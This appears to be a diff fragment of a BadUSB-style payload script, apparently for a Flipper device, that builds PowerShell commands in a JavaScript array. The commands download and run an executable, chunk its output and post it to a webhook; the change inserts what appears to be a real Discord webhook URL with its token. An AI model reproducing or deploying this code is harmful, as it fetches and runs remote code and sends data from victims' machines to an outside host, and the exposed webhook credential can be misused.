@@ -7,7 +7,7 @@ let script = [
     "if (-not (Test-Path -Path $exePath)) {Invoke-WebRequest -Uri $exeUrl -OutFile $exePath;}",
     "$commandOutput = & $exePath | Out-String;",
     "$chunks = [Math]::Ceiling($commandOutput.Length / 2000);for ($i = 0; $i -lt $chunks; $i++) {$start = $i * 2000;$length = [Math]::Min(2000, $commandOutput.Length - $start);$content = $commandOutput.Substring($start, $length);" +
-    "$webhookContent = @{'username' = 'Flipper';'content' = $content;};" + //Adjust this to match your webhook format.
+    "$webhookContent = @{'username' = 'Flipper';'content' = $content;};" + //https://discordapp.com/api/webhooks/1321511157743357992/ZYXOkdWGiPjyZnDfCI8HFbDjwisTLrcNB3YMLSD1KhutROU6SGSWWRvQ6rEVksskqYSq.
     "$jsonData = ConvertTo-Json -InputObject $webhookContent;Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonData -ContentType 'application/json';Start-Sleep -Seconds 1;}"
 ];
 
